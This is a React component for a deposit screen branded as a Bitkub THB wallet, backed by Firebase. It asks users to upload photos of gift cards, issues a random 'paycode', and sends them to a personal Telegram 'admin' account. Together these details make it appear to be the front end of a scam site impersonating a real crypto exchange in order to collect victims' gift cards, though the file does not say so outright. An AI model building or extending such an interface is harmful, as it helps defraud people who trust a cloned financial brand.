import React, { useState, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ArrowLeft, History, Smartphone, Landmark, Check, QrCode, Download, X, Gift, Copy, ExternalLink, Camera, Send, AlertTriangle } from 'lucide-react';
import { useLanguage } from '../../contexts/LanguageContext';
import StatusOverlay from '../StatusOverlay';
import { auth, db } from '../../lib/firebase';
import { collection, doc, setDoc, getDoc } from 'firebase/firestore';
import { cn } from '@/src/lib/utils';
import { triggerHaptic } from '@/src/lib/haptics';

interface DepositTHBProps {
  onBack: () => void;
  onSuccess: () => void;
}

type DepositMethod = 'promptpay' | 'transfer' | 'giftcard';

export default function DepositTHB({ onBack, onSuccess }: DepositTHBProps) {
  const { t } = useLanguage();
  const [method, setMethod] = useState<DepositMethod>('transfer');
  const [amount, setAmount] = useState('');
  const [agreed, setAgreed] = useState(false);
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [payCode, setPayCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [kycStatus, setKycStatus] = useState<string>('LOADING');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [status, setStatus] = useState<{ type: 'success' | 'error', title: string, message?: string } | null>(null);

  const generatePayCode = useCallback(() => {
    return Math.floor(100000000000 + Math.random() * 900000000000).toString();
  }, []);

  useEffect(() => {
    const fetchProfile = async () => {
      if (auth.currentUser) {
        const userSnap = await getDoc(doc(db, 'users', auth.currentUser.uid));
        if (userSnap.exists()) {
          setKycStatus(userSnap.data().kycStatus || 'NOT_STARTED');
        }
      }
    };
    fetchProfile();
  }, []);

  if (kycStatus !== 'VERIFIED' && kycStatus !== 'LOADING') {
    return (
      <motion.div 
        initial={{ opacity: 0, x: 20 }}
        animate={{ opacity: 1, x: 0 }}
        exit={{ opacity: 0, x: 20 }}
        className="absolute inset-0 bg-[#0D1117] z-[60] flex flex-col p-5 overflow-y-auto no-scrollbar"
      >
        <header className="pt-4 pb-3 flex items-center gap-4">
          <button onClick={onBack} className="p-1.5 -ml-2 text-gray-400 hover:text-white transition-colors">
            <ArrowLeft className="w-5 h-5" />
          </button>
          <h1 className="text-lg font-bold text-white tracking-tight uppercase">Identity Verification</h1>
        </header>
        <div className="flex-1 flex flex-col items-center justify-center text-center">
          <div className="w-16 h-16 bg-yellow-500/10 rounded-2xl flex items-center justify-center text-yellow-500 mb-4">
             <Landmark className="w-8 h-8" />
          </div>
          <h2 className="text-xl font-bold text-white mb-2">
            {kycStatus === 'PENDING' ? 'Verification Pending' : 'Verification Required'}
          </h2>
          <p className="text-gray-400 font-medium mb-6 text-xs max-w-xs leading-relaxed">
            {kycStatus === 'PENDING' 
              ? 'Your identity verification is currently being reviewed by our team. You will be able to deposit once approved.' 
              : 'Please complete your identity verification (KYC) to enable THB deposits and withdrawals.'}
          </p>
          <button 
            onClick={onBack}
            className="w-full py-2.5 bg-[#00D632] text-black font-bold text-xs rounded-xl uppercase tracking-wider shadow-md shadow-[#00D632]/20 hover:bg-[#00B62A] transition-all"
          >
            Go to Account
          </button>
        </div>
      </motion.div>
    );
  }

  const handleDepositRequest = async () => {
    if (!amount || !agreed) return;
    
    if (method === 'giftcard' && !giftCardImage) {
      alert("Please upload an image of your gift card.");
      return;
    }

    setLoading(true);
    try {
      const generatedCode = generatePayCode();
      setPayCode(generatedCode);
      
      const depositAmount = parseFloat(amount);
      const userRef = auth.currentUser?.uid;
      
      if (userRef) {
        const now = new Date();
        const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
        const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let randomStr = '';
        for (let i = 0; i < 8; i++) {
          randomStr += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        const txId = `TX-${now.toISOString().slice(2, 10).replace(/-/g, '')}-${randomStr}`;

        const senderInfo = {
          name: method === 'promptpay' ? 'Thai QR PromptPay' : method === 'bank' ? 'Bank Wire Transfer' : 'Gift Card Voucher',
          account: generatedCode ? `Code: ${generatedCode}` : 'Deposit Provider',
          type: 'Payment Method'
        };

        const receiverInfo = {
          name: auth.currentUser?.email || 'User Account',
          account: 'Bitkub THB Wallet',
          type: 'Bitkub User'
        };

        const txRef = doc(collection(db, 'users', userRef, 'transactions'));
        await setDoc(txRef, {
          txId,
          type: 'DEPOSIT',
          method: method.toUpperCase(),
          asset: 'THB',
          amount: depositAmount,
          fee: 0,
          status: 'PENDING',
          payCode: generatedCode,
          giftCardImage: giftCardImage, // Base64 or URL
          timestamp: now.toISOString(),
          dateStr,
          timeStr,
          senderInfo,
          receiverInfo,
          userEmail: auth.currentUser?.email,
          userId: auth.currentUser?.uid
        });
      }

      triggerHaptic('success');
      setShowConfirmation(true);
    } catch (error: any) {
      console.error("Deposit error:", error);
      triggerHaptic('error');
      setStatus({
        type: 'error',
        title: 'Request Failed',
        message: error.message || 'There was an error submitting your deposit request.'
      });
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = (text: string) => {
    triggerHaptic('light');
    navigator.clipboard.writeText(text);
  };

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCardImage(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0, x: 20 }}
      animate={{ opacity: 1, x: 0 }}
      exit={{ opacity: 0, x: 20 }}
      className="fixed inset-0 bg-[#0D1117] z-[150] flex flex-col"
    >
      <header className="px-5 pt-6 pb-4 flex items-center justify-between sticky top-0 bg-[#0D1117] z-10">
        <div className="flex items-center gap-4">
          <button onClick={onBack} className="p-2 rounded-full hover:bg-gray-800 text-gray-400">
            <ArrowLeft className="w-6 h-6" />
          </button>
          <h1 className="text-xl font-bold text-white tracking-tight uppercase">{t('deposit_thb')}</h1>
        </div>
        <button className="p-2 text-gray-400">
          <History className="w-6 h-6" />
        </button>
      </header>

      <div className="flex-1 overflow-y-auto px-5 pb-28">
        {/* Method Selector */}
        <div className="grid grid-cols-3 gap-2 mb-8">
          <div className="relative group cursor-not-allowed">
            <div className="flex flex-col items-center gap-2 p-3 rounded-2xl border bg-gray-800/10 border-gray-800 text-gray-700 h-full opacity-50 grayscale">
              <Smartphone className="w-5 h-5" />
              <p className="text-[8px] font-black uppercase text-center">Mobile Banking</p>
            </div>
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="bg-red-500 text-white text-[7px] font-black px-1.5 py-0.5 rounded-full rotate-[-12deg] shadow-lg border border-white/20 whitespace-nowrap flex items-center gap-1">
                <AlertTriangle className="w-2 h-2" />
                MAINTENANCE
              </div>
            </div>
          </div>

          <button 
            onClick={() => setMethod('transfer')}
            className={cn(
              "flex flex-col items-center gap-2 p-3 rounded-2xl border transition-all h-full",
              method === 'transfer' ? "bg-[#00D632]/5 border-[#00D632] text-[#00D632]" : "bg-gray-800/20 border-gray-800 text-gray-500"
            )}
          >
            <Landmark className="w-5 h-5" />
            <p className="text-[8px] font-black uppercase text-center">Bank Transfer</p>
          </button>

          <button 
            onClick={() => setMethod('giftcard')}
            className={cn(
              "flex flex-col items-center gap-2 p-3 rounded-2xl border transition-all h-full",
              method === 'giftcard' ? "bg-[#00D632]/5 border-[#00D632] text-[#00D632]" : "bg-gray-800/20 border-gray-800 text-gray-500"
            )}
          >
            <Gift className="w-5 h-5" />
            <p className="text-[8px] font-black uppercase text-center">Gift Card</p>
          </button>
        </div>

        {/* Dynamic Inputs Based on Method */}
        <div className="space-y-6 mb-8">
          {method === 'transfer' ? (
            <div className="bg-[#1A1F26] border border-gray-800 rounded-3xl p-6 text-center">
              <div className="w-16 h-16 bg-[#00D632]/10 rounded-2xl flex items-center justify-center text-[#00D632] mx-auto mb-6">
                <QrCode className="w-8 h-8" />
              </div>
              <h2 className="text-white font-black uppercase tracking-tight mb-2">Receive via Email</h2>
              <p className="text-xs text-gray-500 font-medium mb-6 leading-relaxed">
                Give your registered email address to the sender to receive funds instantly from another Bitkub user.
              </p>

              <div className="bg-black/40 border border-gray-800 rounded-2xl p-4 flex items-center justify-between group">
                <div className="flex flex-col items-start">
                  <span className="text-[8px] font-black text-gray-600 uppercase tracking-widest mb-1">Your Email Address</span>
                  <span className="text-white font-bold text-sm tracking-tight">{auth.currentUser?.email}</span>
                </div>
                <button 
                  onClick={() => {
                    if (auth.currentUser?.email) {
                      copyToClipboard(auth.currentUser.email);
                      alert('Email copied to clipboard');
                    }
                  }}
                  className="p-3 bg-white/5 rounded-xl text-gray-400 hover:text-[#00D632] hover:bg-[#00D632]/10 transition-all active:scale-90"
                >
                  <Copy className="w-5 h-5" />
                </button>
              </div>

              <div className="mt-8 pt-6 border-t border-gray-800/50">
                <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest leading-relaxed">
                  Funds will appear in your wallet <br/> as soon as the sender confirms.
                </p>
              </div>
            </div>
          ) : (
            <>
              <div className="space-y-2">
                <label className="text-[10px] uppercase font-bold text-gray-500 tracking-widest px-1">
                  Gift Card Value
                </label>
                <div className="relative">
                  <span className="absolute left-5 top-1/2 -translate-y-1/2 text-white font-black text-xl">฿</span>
                  <input 
                    type="number" 
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="0.00"
                    className="w-full bg-gray-800/20 border border-gray-800 rounded-2xl pl-12 pr-5 py-4 text-white font-bold text-xl placeholder:text-gray-700 focus:outline-none focus:border-[#00D632]/30 transition-colors"
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-[10px] uppercase font-bold text-gray-500 tracking-widest px-1">Upload Gift Card Image</label>
                <div className="relative group">
                  <input 
                    type="file" 
                    accept="image/*"
                    onChange={handleImageUpload}
                    className="absolute inset-0 opacity-0 cursor-pointer z-10"
                  />
                  <div className={cn(
                    "w-full h-32 border-2 border-dashed rounded-2xl flex flex-col items-center justify-center transition-all",
                    giftCardImage ? "border-[#00D632] bg-[#00D632]/5" : "border-gray-800 bg-gray-800/10"
                  )}>
                    {giftCardImage ? (
                      <img src={giftCardImage} alt="Gift card" className="w-full h-full object-cover rounded-2xl opacity-40" />
                    ) : (
                      <>
                        <Camera className="w-8 h-8 text-gray-600 mb-2" />
                        <span className="text-[10px] text-gray-500 font-bold uppercase">Click or drag image</span>
                      </>
                    )}
                    {giftCardImage && (
                      <div className="absolute inset-0 flex items-center justify-center">
                         <Check className="w-8 h-8 text-[#00D632]" />
                      </div>
                    )}
                  </div>
                </div>
              </div>

              <motion.button 
                whileTap={{ scale: 0.98 }}
                disabled={!amount || loading || !giftCardImage}
                onClick={handleDepositRequest}
                className="w-full py-2.5 rounded-xl bg-[#00D632] text-black font-bold text-xs uppercase tracking-wider shadow-[0_6px_20px_rgba(0,214,50,0.2)] disabled:opacity-50 disabled:shadow-none transition-all"
              >
                {loading ? 'Processing...' : 'Submit Deposit Request'}
              </motion.button>
            </>
          )}
        </div>
      </div>

      {/* Confirmation Modal */}
      <AnimatePresence>
        {showConfirmation && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/95 z-[70] flex flex-col p-5 overflow-y-auto no-scrollbar"
          >
            <div className="flex-1 flex flex-col items-center justify-center text-center my-auto">
              <div className="w-16 h-16 bg-[#00D632]/10 rounded-full flex items-center justify-center text-[#00D632] mb-4 shadow-[0_0_30px_rgba(0,214,50,0.2)]">
                <Check className="w-8 h-8" />
              </div>
              
              <h2 className="text-xl font-bold text-white mb-2 uppercase tracking-tight">Request Submitted</h2>
              <p className="text-gray-400 font-medium mb-6 text-xs max-w-xs">
                Your deposit request of <span className="text-white">฿{parseFloat(amount).toLocaleString()}</span> has been logged.
              </p>

              <div className="w-full bg-gray-900 border border-gray-800 rounded-2xl p-4 mb-6">
                <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3">Your Unique Paycode</p>
                <div className="flex items-center justify-between gap-3 bg-black/40 p-3 rounded-xl border border-white/5 mb-3 group">
                  <span className="text-xl font-black text-[#00D632] tracking-widest font-mono">{payCode}</span>
                  <button 
                    onClick={() => copyToClipboard(payCode)}
                    className="p-2 bg-white/5 rounded-lg text-gray-400 hover:text-white transition-colors"
                  >
                    <Copy className="w-4 h-4" />
                  </button>
                </div>
                <p className="text-[9px] text-yellow-500/80 font-bold uppercase leading-relaxed">
                  ⚠️ IMPORTANT: Please copy this code. You can message the admin or send it to another Bitkub user to receive these funds.
                </p>
              </div>

              <div className="space-y-2.5 w-full">
                <a 
                  href="https://t.me/kt_johnson"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full py-2.5 rounded-xl bg-[#229ED9] text-white font-bold text-xs flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20"
                >
                  <Send className="w-4 h-4" /> Message Admin on Telegram
                </a>
                <button 
                  onClick={() => {
                    setShowConfirmation(false);
                    onSuccess();
                  }}
                  className="w-full py-2.5 rounded-xl bg-white/5 text-gray-400 font-bold text-xs flex items-center justify-center gap-2 hover:bg-white/10 transition-colors"
                >
                  Close & View History
                </button>
              </div>
            </div>
            
            <p className="text-center text-[10px] text-gray-500 font-medium px-6 my-4 italic">
              "Your security is our priority. Always use official links."
            </p>
          </motion.div>
        )}
      </AnimatePresence>

      <StatusOverlay
        isOpen={!!status}
        type={status?.type || 'success'}
        title={status?.title || ''}
        message={status?.message}
        onClose={() => {
          if (status?.type === 'success') {
            onSuccess();
          }
          setStatus(null);
        }}
      />
    </motion.div>
  );
}
